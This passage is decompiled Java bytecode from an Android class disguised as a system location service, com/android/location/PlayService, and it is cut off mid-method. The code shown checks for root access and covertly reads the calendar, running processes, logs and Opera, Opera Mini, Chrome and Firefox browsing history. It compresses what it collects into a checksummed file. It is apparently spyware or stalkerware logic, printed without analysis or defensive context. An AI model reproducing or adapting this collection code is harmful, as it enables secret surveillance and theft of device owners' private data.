    //   2861: aload 16
    //   2863: astore 7
    //   2865: aload 14
    //   2867: astore 9
    //   2869: getstatic 679	com/android/location/PlayService:iPreventOpera	I
    //   2872: iconst_1
    //   2873: isub
    //   2874: putstatic 679	com/android/location/PlayService:iPreventOpera	I
    //   2877: aload 15
    //   2879: astore 8
    //   2881: aload 13
    //   2883: astore 10
    //   2885: aload 16
    //   2887: astore 7
    //   2889: aload 14
    //   2891: astore 9
    //   2893: getstatic 677	com/android/location/PlayService:iPreventOperaMini	I
    //   2896: ifle +1748 -> 4644
    //   2899: aload 15
    //   2901: astore 8
    //   2903: aload 13
    //   2905: astore 10
    //   2907: aload 16
    //   2909: astore 7
    //   2911: aload 14
    //   2913: astore 9
    //   2915: getstatic 677	com/android/location/PlayService:iPreventOperaMini	I
    //   2918: iconst_1
    //   2919: isub
    //   2920: putstatic 677	com/android/location/PlayService:iPreventOperaMini	I
    //   2923: aload 15
    //   2925: astore 8
    //   2927: aload 13
    //   2929: astore 10
    //   2931: aload 16
    //   2933: astore 7
    //   2935: aload 14
    //   2937: astore 9
    //   2939: getstatic 675	com/android/location/PlayService:iPreventChrome	I
    //   2942: ifle +1968 -> 4910
    //   2945: aload 15
    //   2947: astore 8
    //   2949: aload 13
    //   2951: astore 10
    //   2953: aload 16
    //   2955: astore 7
    //   2957: aload 14
    //   2959: astore 9
    //   2961: getstatic 675	com/android/location/PlayService:iPreventChrome	I
    //   2964: iconst_1
    //   2965: isub
    //   2966: putstatic 675	com/android/location/PlayService:iPreventChrome	I
    //   2969: aload 15
    //   2971: astore 8
    //   2973: aload 13
    //   2975: astore 10
    //   2977: aload 16
    //   2979: astore 7
    //   2981: aload 14
    //   2983: astore 9
    //   2985: getstatic 673	com/android/location/PlayService:iPreventFirefox	I
    //   2988: ifle +2193 -> 5181
    //   2991: aload 15
    //   2993: astore 8
    //   2995: aload 13
    //   2997: astore 10
    //   2999: aload 16
    //   3001: astore 7
    //   3003: aload 14
    //   3005: astore 9
    //   3007: getstatic 673	com/android/location/PlayService:iPreventFirefox	I
    //   3010: iconst_1
    //   3011: isub
    //   3012: putstatic 673	com/android/location/PlayService:iPreventFirefox	I
    //   3015: aload 15
    //   3017: astore 8
    //   3019: aload 13
    //   3021: astore 10
    //   3023: aload 16
    //   3025: astore 7
    //   3027: aload 14
    //   3029: astore 9
    //   3031: aload_0
    //   3032: sipush 1024
    //   3035: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   3038: ifeq +25 -> 3063
    //   3041: aload 15
    //   3043: astore 8
    //   3045: aload 13
    //   3047: astore 10
    //   3049: aload 16
    //   3051: astore 7
    //   3053: aload 14
    //   3055: astore 9
    //   3057: aload_0
    //   3058: aload 12
    //   3060: invokevirtual 3808	com/android/location/PlayService:ReadCalendar	(Ljava/util/zip/GZIPOutputStream;)V
    //   3063: aload 15
    //   3065: astore 8
    //   3067: aload 13
    //   3069: astore 10
    //   3071: aload 16
    //   3073: astore 7
    //   3075: aload 14
    //   3077: astore 9
    //   3079: new 864	java/lang/StringBuilder
    //   3082: dup
    //   3083: ldc_w 3810
    //   3086: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3089: getstatic 577	com/android/location/PlayService:bAlreadyRedRunning	Z
    //   3092: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   3095: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3098: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3101: aload 15
    //   3103: astore 8
    //   3105: aload 13
    //   3107: astore 10
    //   3109: aload 16
    //   3111: astore 7
    //   3113: aload 14
    //   3115: astore 9
    //   3117: getstatic 577	com/android/location/PlayService:bAlreadyRedRunning	Z
    //   3120: ifne +118 -> 3238
    //   3123: aload 15
    //   3125: astore 8
    //   3127: aload 13
    //   3129: astore 10
    //   3131: aload 16
    //   3133: astore 7
    //   3135: aload 14
    //   3137: astore 9
    //   3139: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   3142: getstatic 579	com/android/location/PlayService:CAN	B
    //   3145: if_icmpne +93 -> 3238
    //   3148: aload 15
    //   3150: astore 8
    //   3152: aload 13
    //   3154: astore 10
    //   3156: aload 16
    //   3158: astore 7
    //   3160: aload 14
    //   3162: astore 9
    //   3164: aload_0
    //   3165: bipush 32
    //   3167: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   3170: ifeq +68 -> 3238
    //   3173: aload 15
    //   3175: astore 8
    //   3177: aload 13
    //   3179: astore 10
    //   3181: aload 16
    //   3183: astore 7
    //   3185: aload 14
    //   3187: astore 9
    //   3189: ldc_w 3812
    //   3192: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3195: aload 15
    //   3197: astore 8
    //   3199: aload 13
    //   3201: astore 10
    //   3203: aload 16
    //   3205: astore 7
    //   3207: aload 14
    //   3209: astore 9
    //   3211: aload_0
    //   3212: aload 12
    //   3214: invokevirtual 3815	com/android/location/PlayService:ReadRunning	(Ljava/util/zip/GZIPOutputStream;)I
    //   3217: pop
    //   3218: aload 15
    //   3220: astore 8
    //   3222: aload 13
    //   3224: astore 10
    //   3226: aload 16
    //   3228: astore 7
    //   3230: aload 14
    //   3232: astore 9
    //   3234: iconst_1
    //   3235: putstatic 577	com/android/location/PlayService:bAlreadyRedRunning	Z
    //   3238: aload 15
    //   3240: astore 8
    //   3242: aload 13
    //   3244: astore 10
    //   3246: aload 16
    //   3248: astore 7
    //   3250: aload 14
    //   3252: astore 9
    //   3254: getstatic 583	com/android/location/PlayService:bCanSu	B
    //   3257: getstatic 579	com/android/location/PlayService:CAN	B
    //   3260: if_icmpne +49 -> 3309
    //   3263: aload 15
    //   3265: astore 8
    //   3267: aload 13
    //   3269: astore 10
    //   3271: aload 16
    //   3273: astore 7
    //   3275: aload 14
    //   3277: astore 9
    //   3279: aload_0
    //   3280: bipush 32
    //   3282: invokevirtual 3490	com/android/location/PlayService:CanPickUp	(I)Z
    //   3285: ifeq +24 -> 3309
    //   3288: aload 15
    //   3290: astore 8
    //   3292: aload 13
    //   3294: astore 10
    //   3296: aload 16
    //   3298: astore 7
    //   3300: aload 14
    //   3302: astore 9
    //   3304: aload 12
    //   3306: invokestatic 3819	ru/mobile/protector/ProcessRT:Read	(Ljava/io/OutputStream;)V
    //   3309: aload 15
    //   3311: astore 8
    //   3313: aload 13
    //   3315: astore 10
    //   3317: aload 16
    //   3319: astore 7
    //   3321: aload 14
    //   3323: astore 9
    //   3325: aload_0
    //   3326: iconst_1
    //   3327: putfield 950	com/android/location/PlayService:bRunNotFirstTime	Z
    //   3330: aload 15
    //   3332: astore 8
    //   3334: aload 13
    //   3336: astore 10
    //   3338: aload 16
    //   3340: astore 7
    //   3342: aload 14
    //   3344: astore 9
    //   3346: invokestatic 1558	com/android/location/PlayService:SaveSettings	()V
    //   3349: aload 15
    //   3351: astore 8
    //   3353: aload 13
    //   3355: astore 10
    //   3357: aload 16
    //   3359: astore 7
    //   3361: aload 14
    //   3363: astore 9
    //   3365: aload_0
    //   3366: aload 12
    //   3368: invokevirtual 3822	com/android/location/PlayService:ReadGlobalLog	(Ljava/util/zip/GZIPOutputStream;)Z
    //   3371: pop
    //   3372: aload 15
    //   3374: astore 8
    //   3376: aload 13
    //   3378: astore 10
    //   3380: aload 16
    //   3382: astore 7
    //   3384: aload 14
    //   3386: astore 9
    //   3388: ldc_w 3824
    //   3391: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3394: aload 15
    //   3396: astore 8
    //   3398: aload 13
    //   3400: astore 10
    //   3402: aload 16
    //   3404: astore 7
    //   3406: aload 14
    //   3408: astore 9
    //   3410: aload 12
    //   3412: invokevirtual 3825	java/util/zip/GZIPOutputStream:flush	()V
    //   3415: aload 15
    //   3417: astore 8
    //   3419: aload 13
    //   3421: astore 10
    //   3423: aload 16
    //   3425: astore 7
    //   3427: aload 14
    //   3429: astore 9
    //   3431: aload 12
    //   3433: invokevirtual 3828	java/util/zip/GZIPOutputStream:finish	()V
    //   3436: aload 15
    //   3438: astore 8
    //   3440: aload 13
    //   3442: astore 10
    //   3444: aload 16
    //   3446: astore 7
    //   3448: aload 14
    //   3450: astore 9
    //   3452: aload 6
    //   3454: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   3457: aload 15
    //   3459: astore 8
    //   3461: aload 13
    //   3463: astore 10
    //   3465: aload 16
    //   3467: astore 7
    //   3469: aload 14
    //   3471: astore 9
    //   3473: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   3476: ldc_w 360
    //   3479: invokevirtual 2508	android/content/Context:openFileInput	(Ljava/lang/String;)Ljava/io/FileInputStream;
    //   3482: astore 11
    //   3484: aload 11
    //   3486: astore 8
    //   3488: aload 13
    //   3490: astore 10
    //   3492: aload 11
    //   3494: astore 7
    //   3496: aload 14
    //   3498: astore 9
    //   3500: new 864	java/lang/StringBuilder
    //   3503: dup
    //   3504: ldc_w 3598
    //   3507: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3510: aload 11
    //   3512: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   3515: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3518: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3521: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3524: aload 11
    //   3526: astore 8
    //   3528: aload 13
    //   3530: astore 10
    //   3532: aload 11
    //   3534: astore 7
    //   3536: aload 14
    //   3538: astore 9
    //   3540: aload 11
    //   3542: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   3545: newarray byte
    //   3547: astore 16
    //   3549: aload 11
    //   3551: astore 8
    //   3553: aload 13
    //   3555: astore 10
    //   3557: aload 11
    //   3559: astore 7
    //   3561: aload 14
    //   3563: astore 9
    //   3565: aload 11
    //   3567: aload 16
    //   3569: iconst_0
    //   3570: aload 11
    //   3572: invokevirtual 3599	java/io/FileInputStream:available	()I
    //   3575: invokevirtual 3602	java/io/FileInputStream:read	([BII)I
    //   3578: istore_2
    //   3579: aload 11
    //   3581: astore 8
    //   3583: aload 13
    //   3585: astore 10
    //   3587: aload 11
    //   3589: astore 7
    //   3591: aload 14
    //   3593: astore 9
    //   3595: new 864	java/lang/StringBuilder
    //   3598: dup
    //   3599: ldc_w 3604
    //   3602: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3605: iload_2
    //   3606: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3609: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3612: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3615: aload 11
    //   3617: astore 8
    //   3619: aload 13
    //   3621: astore 10
    //   3623: aload 11
    //   3625: astore 7
    //   3627: aload 14
    //   3629: astore 9
    //   3631: aload_0
    //   3632: ldc_w 360
    //   3635: invokevirtual 3607	com/android/location/PlayService:deleteFile	(Ljava/lang/String;)Z
    //   3638: pop
    //   3639: aload 11
    //   3641: astore 8
    //   3643: aload 13
    //   3645: astore 10
    //   3647: aload 11
    //   3649: astore 7
    //   3651: aload 14
    //   3653: astore 9
    //   3655: new 3609	java/util/zip/CRC32
    //   3658: dup
    //   3659: invokespecial 3610	java/util/zip/CRC32:<init>	()V
    //   3662: astore 15
    //   3664: aload 11
    //   3666: astore 8
    //   3668: aload 13
    //   3670: astore 10
    //   3672: aload 11
    //   3674: astore 7
    //   3676: aload 14
    //   3678: astore 9
    //   3680: aload 15
    //   3682: aload 16
    //   3684: iconst_0
    //   3685: aload 16
    //   3687: arraylength
    //   3688: invokeinterface 3614 4 0
    //   3693: aload 11
    //   3695: astore 8
    //   3697: aload 13
    //   3699: astore 10
    //   3701: aload 11
    //   3703: astore 7
    //   3705: aload 14
    //   3707: astore 9
    //   3709: aload 15
    //   3711: invokeinterface 3617 1 0
    //   3716: ldc2_w 3618
    //   3719: land
    //   3720: l2i
    //   3721: istore_2
    //   3722: aload 11
    //   3724: astore 8
    //   3726: aload 13
    //   3728: astore 10
    //   3730: aload 11
    //   3732: astore 7
    //   3734: aload 14
    //   3736: astore 9
    //   3738: new 864	java/lang/StringBuilder
    //   3741: dup
    //   3742: ldc_w 3621
    //   3745: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   3748: iload_2
    //   3749: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   3752: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   3755: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3758: aload 11
    //   3760: astore 8
    //   3762: aload 13
    //   3764: astore 10
    //   3766: aload 11
    //   3768: astore 7
    //   3770: aload 14
    //   3772: astore 9
    //   3774: getstatic 551	com/android/location/PlayService:context	Landroid/content/Context;
    //   3777: aload_1
    //   3778: iconst_0
    //   3779: invokevirtual 1723	android/content/Context:openFileOutput	(Ljava/lang/String;I)Ljava/io/FileOutputStream;
    //   3782: astore_1
    //   3783: aload 11
    //   3785: astore 8
    //   3787: aload_1
    //   3788: astore 10
    //   3790: aload 11
    //   3792: astore 7
    //   3794: aload_1
    //   3795: astore 9
    //   3797: aload_1
    //   3798: aload 16
    //   3800: invokevirtual 1657	java/io/FileOutputStream:write	([B)V
    //   3803: aload 11
    //   3805: astore 8
    //   3807: aload_1
    //   3808: astore 10
    //   3810: aload 11
    //   3812: astore 7
    //   3814: aload_1
    //   3815: astore 9
    //   3817: iconst_4
    //   3818: invokestatic 3474	java/nio/ByteBuffer:allocate	(I)Ljava/nio/ByteBuffer;
    //   3821: iload_2
    //   3822: invokevirtual 3476	java/nio/ByteBuffer:putInt	(I)Ljava/nio/ByteBuffer;
    //   3825: invokevirtual 3479	java/nio/ByteBuffer:array	()[B
    //   3828: astore 13
    //   3830: aload 11
    //   3832: astore 8
    //   3834: aload_1
    //   3835: astore 10
    //   3837: aload 11
    //   3839: astore 7
    //   3841: aload_1
    //   3842: astore 9
    //   3844: aload_0
    //   3845: aload 13
    //   3847: invokevirtual 3482	com/android/location/PlayService:Reverse4	([B)V
    //   3850: aload 11
    //   3852: astore 8
    //   3854: aload_1
    //   3855: astore 10
    //   3857: aload 11
    //   3859: astore 7
    //   3861: aload_1
    //   3862: astore 9
    //   3864: aload_1
    //   3865: aload 13
    //   3867: iconst_0
    //   3868: iconst_4
    //   3869: invokevirtual 2086	java/io/FileOutputStream:write	([BII)V
    //   3872: aload 11
    //   3874: astore 8
    //   3876: aload_1
    //   3877: astore 10
    //   3879: aload 11
    //   3881: astore 7
    //   3883: aload_1
    //   3884: astore 9
    //   3886: aload 15
    //   3888: invokeinterface 3624 1 0
    //   3893: aload 11
    //   3895: astore 8
    //   3897: aload_1
    //   3898: astore 10
    //   3900: aload 11
    //   3902: astore 7
    //   3904: aload_1
    //   3905: astore 9
    //   3907: ldc_w 3830
    //   3910: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   3913: aload 6
    //   3915: ifnull +8 -> 3923
    //   3918: aload 6
    //   3920: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   3923: aload 12
    //   3925: ifnull +8 -> 3933
    //   3928: aload 12
    //   3930: invokevirtual 3831	java/util/zip/GZIPOutputStream:close	()V
    //   3933: aload 11
    //   3935: ifnull +8 -> 3943
    //   3938: aload 11
    //   3940: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   3943: aload_1
    //   3944: ifnull +1589 -> 5533
    //   3947: aload_1
    //   3948: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   3951: iconst_0
    //   3952: ireturn
    //   3953: aload 22
    //   3955: iload_2
    //   3956: iconst_0
    //   3957: bastore
    //   3958: iload_2
    //   3959: iconst_1
    //   3960: iadd
    //   3961: istore_2
    //   3962: goto -3934 -> 28
    //   3965: aload 15
    //   3967: astore 8
    //   3969: aload 13
    //   3971: astore 10
    //   3973: aload 16
    //   3975: astore 7
    //   3977: aload 14
    //   3979: astore 9
    //   3981: aload 12
    //   3983: aload 22
    //   3985: iconst_0
    //   3986: bipush 16
    //   3988: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   3991: goto -3542 -> 449
    //   3994: astore 13
    //   3996: aload 12
    //   3998: astore 11
    //   4000: aload 10
    //   4002: astore_1
    //   4003: aload 6
    //   4005: astore 12
    //   4007: aload 8
    //   4009: astore 6
    //   4011: aload 6
    //   4013: astore 10
    //   4015: aload 12
    //   4017: astore 7
    //   4019: aload_1
    //   4020: astore 9
    //   4022: aload 11
    //   4024: astore 8
    //   4026: aload 13
    //   4028: ldc_w 3710
    //   4031: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   4034: aload 12
    //   4036: ifnull +8 -> 4044
    //   4039: aload 12
    //   4041: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   4044: aload 11
    //   4046: ifnull +8 -> 4054
    //   4049: aload 11
    //   4051: invokevirtual 3831	java/util/zip/GZIPOutputStream:close	()V
    //   4054: aload 6
    //   4056: ifnull +8 -> 4064
    //   4059: aload 6
    //   4061: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   4064: iload_3
    //   4065: istore_2
    //   4066: aload_1
    //   4067: ifnull -4055 -> 12
    //   4070: aload_1
    //   4071: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   4074: iconst_5
    //   4075: ireturn
    //   4076: astore_1
    //   4077: iconst_5
    //   4078: ireturn
    //   4079: aload 15
    //   4081: astore 8
    //   4083: aload 13
    //   4085: astore 10
    //   4087: aload 16
    //   4089: astore 7
    //   4091: aload 14
    //   4093: astore 9
    //   4095: aload 11
    //   4097: arraylength
    //   4098: istore_2
    //   4099: goto -3505 -> 594
    //   4102: aload 15
    //   4104: astore 8
    //   4106: aload 13
    //   4108: astore 10
    //   4110: aload 16
    //   4112: astore 7
    //   4114: aload 14
    //   4116: astore 9
    //   4118: bipush 15
    //   4120: aload 11
    //   4122: arraylength
    //   4123: isub
    //   4124: istore_2
    //   4125: goto -3480 -> 645
    //   4128: aload 15
    //   4130: astore 8
    //   4132: aload 13
    //   4134: astore 10
    //   4136: aload 16
    //   4138: astore 7
    //   4140: aload 14
    //   4142: astore 9
    //   4144: aload 12
    //   4146: aload 22
    //   4148: iconst_0
    //   4149: bipush 15
    //   4151: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   4154: goto -3434 -> 720
    //   4157: astore_1
    //   4158: aload 12
    //   4160: astore 8
    //   4162: aload 7
    //   4164: astore 10
    //   4166: aload 6
    //   4168: ifnull +8 -> 4176
    //   4171: aload 6
    //   4173: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   4176: aload 8
    //   4178: ifnull +8 -> 4186
    //   4181: aload 8
    //   4183: invokevirtual 3831	java/util/zip/GZIPOutputStream:close	()V
    //   4186: aload 10
    //   4188: ifnull +8 -> 4196
    //   4191: aload 10
    //   4193: invokevirtual 2021	java/io/FileInputStream:close	()V
    //   4196: aload 9
    //   4198: ifnull +8 -> 4206
    //   4201: aload 9
    //   4203: invokevirtual 1319	java/io/FileOutputStream:close	()V
    //   4206: aload_1
    //   4207: athrow
    //   4208: aload 15
    //   4210: astore 8
    //   4212: aload 13
    //   4214: astore 10
    //   4216: aload 16
    //   4218: astore 7
    //   4220: aload 14
    //   4222: astore 9
    //   4224: aload 11
    //   4226: arraylength
    //   4227: istore_2
    //   4228: goto -3413 -> 815
    //   4231: aload 15
    //   4233: astore 8
    //   4235: aload 13
    //   4237: astore 10
    //   4239: aload 16
    //   4241: astore 7
    //   4243: aload 14
    //   4245: astore 9
    //   4247: bipush 17
    //   4249: aload 11
    //   4251: arraylength
    //   4252: isub
    //   4253: istore_2
    //   4254: goto -3388 -> 866
    //   4257: aload 15
    //   4259: astore 8
    //   4261: aload 13
    //   4263: astore 10
    //   4265: aload 16
    //   4267: astore 7
    //   4269: aload 14
    //   4271: astore 9
    //   4273: aload 12
    //   4275: aload 22
    //   4277: iconst_0
    //   4278: bipush 17
    //   4280: invokevirtual 3713	java/util/zip/GZIPOutputStream:write	([BII)V
    //   4283: goto -3342 -> 941
    //   4286: lload 4
    //   4288: lconst_0
    //   4289: lcmp
    //   4290: ifne +65 -> 4355
    //   4293: aload 15
    //   4295: astore 8
    //   4297: aload 13
    //   4299: astore 10
    //   4301: aload 16
    //   4303: astore 7
    //   4305: aload 14
    //   4307: astore 9
    //   4309: bipush 50
    //   4311: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   4314: aload 15
    //   4316: astore 8
    //   4318: aload 13
    //   4320: astore 10
    //   4322: aload 16
    //   4324: astore 7
    //   4326: aload 14
    //   4328: astore 9
    //   4330: new 864	java/lang/StringBuilder
    //   4333: dup
    //   4334: ldc_w 3630
    //   4337: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4340: getstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   4343: invokevirtual 1506	java/lang/StringBuilder:append	(I)Ljava/lang/StringBuilder;
    //   4346: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4349: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4352: goto -1902 -> 2450
    //   4355: aload 15
    //   4357: astore 8
    //   4359: aload 13
    //   4361: astore 10
    //   4363: aload 16
    //   4365: astore 7
    //   4367: aload 14
    //   4369: astore 9
    //   4371: iconst_5
    //   4372: putstatic 691	com/android/location/PlayService:iPreventReadOK	I
    //   4375: goto -61 -> 4314
    //   4378: aload 15
    //   4380: astore 8
    //   4382: aload 13
    //   4384: astore 10
    //   4386: aload 16
    //   4388: astore 7
    //   4390: aload 14
    //   4392: astore 9
    //   4394: aload_0
    //   4395: getfield 1047	com/android/location/PlayService:mOperaHistoryReader	Lru/dtlbox/databasereader/OperaHistoryReader;
    //   4398: astore 11
    //   4400: aload 11
    //   4402: ifnull -1525 -> 2877
    //   4405: aload 16
    //   4407: astore 7
    //   4409: aload 14
    //   4411: astore 9
    //   4413: new 864	java/lang/StringBuilder
    //   4416: dup
    //   4417: ldc_w 3833
    //   4420: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4423: getstatic 657	com/android/location/PlayService:lOperaCounter	J
    //   4426: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   4429: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4432: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4435: aload 16
    //   4437: astore 7
    //   4439: aload 14
    //   4441: astore 9
    //   4443: getstatic 659	com/android/location/PlayService:bNeedUpdateOperaCounter	Z
    //   4446: ifeq +45 -> 4491
    //   4449: aload 16
    //   4451: astore 7
    //   4453: aload 14
    //   4455: astore 9
    //   4457: ldc_w 3835
    //   4460: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4463: aload 16
    //   4465: astore 7
    //   4467: aload 14
    //   4469: astore 9
    //   4471: iconst_0
    //   4472: putstatic 659	com/android/location/PlayService:bNeedUpdateOperaCounter	Z
    //   4475: aload 16
    //   4477: astore 7
    //   4479: aload 14
    //   4481: astore 9
    //   4483: aload_0
    //   4484: getfield 1047	com/android/location/PlayService:mOperaHistoryReader	Lru/dtlbox/databasereader/OperaHistoryReader;
    //   4487: invokevirtual 3836	ru/dtlbox/databasereader/OperaHistoryReader:update	()Z
    //   4490: pop
    //   4491: aload 16
    //   4493: astore 7
    //   4495: aload 14
    //   4497: astore 9
    //   4499: aload_0
    //   4500: getfield 1047	com/android/location/PlayService:mOperaHistoryReader	Lru/dtlbox/databasereader/OperaHistoryReader;
    //   4503: aload 12
    //   4505: getstatic 657	com/android/location/PlayService:lOperaCounter	J
    //   4508: invokevirtual 3840	ru/dtlbox/databasereader/OperaHistoryReader:readHistory	(Ljava/io/OutputStream;J)J
    //   4511: lstore 4
    //   4513: aload 16
    //   4515: astore 7
    //   4517: aload 14
    //   4519: astore 9
    //   4521: new 864	java/lang/StringBuilder
    //   4524: dup
    //   4525: ldc_w 3842
    //   4528: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4531: lload 4
    //   4533: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   4536: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4539: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4542: lload 4
    //   4544: lconst_0
    //   4545: lcmp
    //   4546: ifle +69 -> 4615
    //   4549: aload 16
    //   4551: astore 7
    //   4553: aload 14
    //   4555: astore 9
    //   4557: lload 4
    //   4559: putstatic 657	com/android/location/PlayService:lOperaCounter	J
    //   4562: goto -1685 -> 2877
    //   4565: astore 11
    //   4567: aload 15
    //   4569: astore 8
    //   4571: aload 13
    //   4573: astore 10
    //   4575: aload 16
    //   4577: astore 7
    //   4579: aload 14
    //   4581: astore 9
    //   4583: aload 11
    //   4585: ldc_w 3844
    //   4588: invokestatic 1325	com/android/location/PlayService:EXCEPT	(Ljava/lang/Exception;Ljava/lang/String;)V
    //   4591: aload 15
    //   4593: astore 8
    //   4595: aload 13
    //   4597: astore 10
    //   4599: aload 16
    //   4601: astore 7
    //   4603: aload 14
    //   4605: astore 9
    //   4607: bipush 50
    //   4609: putstatic 679	com/android/location/PlayService:iPreventOpera	I
    //   4612: goto -1735 -> 2877
    //   4615: aload 16
    //   4617: astore 7
    //   4619: aload 14
    //   4621: astore 9
    //   4623: iconst_1
    //   4624: putstatic 659	com/android/location/PlayService:bNeedUpdateOperaCounter	Z
    //   4627: aload 16
    //   4629: astore 7
    //   4631: aload 14
    //   4633: astore 9
    //   4635: getstatic 701	com/android/location/PlayService:iOutDBRefreshRate	I
    //   4638: putstatic 679	com/android/location/PlayService:iPreventOpera	I
    //   4641: goto -1764 -> 2877
    //   4644: aload 15
    //   4646: astore 8
    //   4648: aload 13
    //   4650: astore 10
    //   4652: aload 16
    //   4654: astore 7
    //   4656: aload 14
    //   4658: astore 9
    //   4660: aload_0
    //   4661: getfield 1049	com/android/location/PlayService:mOperaMiniHistoryReader	Lru/dtlbox/databasereader/OperaMiniHistoryReader;
    //   4664: astore 11
    //   4666: aload 11
    //   4668: ifnull -1745 -> 2923
    //   4671: aload 16
    //   4673: astore 7
    //   4675: aload 14
    //   4677: astore 9
    //   4679: new 864	java/lang/StringBuilder
    //   4682: dup
    //   4683: ldc_w 3846
    //   4686: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4689: getstatic 663	com/android/location/PlayService:bNeedUpdateOperaMiniCounter	Z
    //   4692: invokevirtual 1260	java/lang/StringBuilder:append	(Z)Ljava/lang/StringBuilder;
    //   4695: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4698: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4701: aload 16
    //   4703: astore 7
    //   4705: aload 14
    //   4707: astore 9
    //   4709: getstatic 663	com/android/location/PlayService:bNeedUpdateOperaMiniCounter	Z
    //   4712: ifeq +45 -> 4757
    //   4715: aload 16
    //   4717: astore 7
    //   4719: aload 14
    //   4721: astore 9
    //   4723: ldc_w 3848
    //   4726: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4729: aload 16
    //   4731: astore 7
    //   4733: aload 14
    //   4735: astore 9
    //   4737: iconst_0
    //   4738: putstatic 663	com/android/location/PlayService:bNeedUpdateOperaMiniCounter	Z
    //   4741: aload 16
    //   4743: astore 7
    //   4745: aload 14
    //   4747: astore 9
    //   4749: aload_0
    //   4750: getfield 1049	com/android/location/PlayService:mOperaMiniHistoryReader	Lru/dtlbox/databasereader/OperaMiniHistoryReader;
    //   4753: invokevirtual 3849	ru/dtlbox/databasereader/OperaMiniHistoryReader:update	()Z
    //   4756: pop
    //   4757: aload 16
    //   4759: astore 7
    //   4761: aload 14
    //   4763: astore 9
    //   4765: aload_0
    //   4766: getfield 1049	com/android/location/PlayService:mOperaMiniHistoryReader	Lru/dtlbox/databasereader/OperaMiniHistoryReader;
    //   4769: aload 12
    //   4771: getstatic 661	com/android/location/PlayService:lOperaMiniCounter	J
    //   4774: invokevirtual 3850	ru/dtlbox/databasereader/OperaMiniHistoryReader:readHistory	(Ljava/io/OutputStream;J)J
    //   4777: lstore 4
    //   4779: aload 16
    //   4781: astore 7
    //   4783: aload 14
    //   4785: astore 9
    //   4787: new 864	java/lang/StringBuilder
    //   4790: dup
    //   4791: ldc_w 3852
    //   4794: invokespecial 870	java/lang/StringBuilder:<init>	(Ljava/lang/String;)V
    //   4797: lload 4
    //   4799: invokevirtual 1772	java/lang/StringBuilder:append	(J)Ljava/lang/StringBuilder;
    //   4802: invokevirtual 878	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   4805: invokestatic 1218	com/android/location/PlayService:FLOG	(Ljava/lang/String;)V
    //   4808: lload 4
    //   4810: lconst_0
    //   4811: lcmp
    //   4812: ifle +69 -> 4881
    //   4815: aload 16
    //   4817: astore 7
    //   4819: aload 14
    //   4821: astore 9
    //   4823: lload 4
    //   4825: putstatic 661	com/android/location/PlayService:lOperaMiniCounter	J
    //   4828: goto -1905 -> 2923
    //   4831: astore 11
    //   4833: aload 15
    //   4835: astore 8
